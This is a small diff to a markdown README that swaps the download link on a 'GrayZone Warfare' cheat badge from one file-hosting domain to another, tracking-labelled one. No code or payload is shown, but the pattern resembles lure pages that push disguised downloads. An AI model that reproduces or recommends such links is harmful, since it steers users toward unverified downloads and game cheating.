@@ -1,4 +1,4 @@
-[![Download GrayZone WarfareCheat](https://img.shields.io/badge/Download-GrayZone%20WarfareCheat-blueviolet)](https://downeefiles.com/s/gryznwrfrcht)
+[![Download GrayZone WarfareCheat](https://img.shields.io/badge/Download-GrayZone%20WarfareCheat-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
 
 
 
